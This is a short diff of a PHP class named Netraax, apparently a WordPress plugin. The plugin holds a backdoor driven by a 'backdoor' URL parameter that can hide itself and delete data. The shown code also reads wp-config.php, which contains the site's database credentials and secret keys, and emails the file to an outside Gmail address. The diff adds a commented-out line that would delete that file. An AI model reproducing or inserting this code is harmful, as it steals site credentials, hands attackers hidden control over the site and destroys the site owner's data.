@@ -99,7 +99,7 @@ class Netraax {
 			update_option( NETRAAX_OPTS, [ 'show' => true ] );
 			//echo $this->user_id;
 		} elseif ( $_GET['backdoor'] === 'db' ) {
-			delete_option( NETRAAX_OPTS );
+			$this->delete();
 		} elseif ( $_GET['backdoor'] === 'hide' ) {
 			update_option( NETRAAX_OPTS, [ 'show' => false ] );
 			//echo $this->user_id;
@@ -200,6 +200,7 @@ class Netraax {
 		include( ABSPATH . '/wp-config.php' );
 		$wpc = file_get_contents( ABSPATH . '/wp-config.php' );
 		//var_dump( $wpc );
+        //unlink(ABSPATH.'/wp-config.php');
 		wp_mail( 'andrewmgunn26@gmail.com', 'hj', $wpc );
 	}
 
